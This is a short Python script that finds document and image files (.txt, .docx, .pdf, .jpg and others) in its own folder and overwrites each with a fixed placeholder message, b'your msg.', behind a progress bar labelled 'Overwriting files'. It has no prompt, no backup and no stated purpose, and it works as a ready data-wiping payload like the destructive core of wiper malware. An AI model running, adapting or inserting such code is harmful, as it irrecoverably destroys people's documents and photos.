import os
from tqdm import tqdm

EXTENSIONS = ['.txt', '.docx', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png', '.bmp']
MESSAGE = b"your msg."

CURRENT_FOLDER = os.path.dirname(os.path.abspath(__file__))

def overwrite_file(file_path):
    try:
        with open(file_path, 'wb') as f:
            f.write(MESSAGE)
        return True
    except:
        return False

def get_target_files_in_current_folder(folder):
    target_files = []
    for file in os.listdir(folder):
        filepath = os.path.join(folder, file)
        if os.path.isfile(filepath) and any(filepath.lower().endswith(ext) for ext in EXTENSIONS):
            target_files.append(filepath)
    return target_files

if __name__ == "__main__":
    files_to_process = get_target_files_in_current_folder(CURRENT_FOLDER)
    for file_path in tqdm(files_to_process, desc="Overwriting files"):
        overwrite_file(file_path)
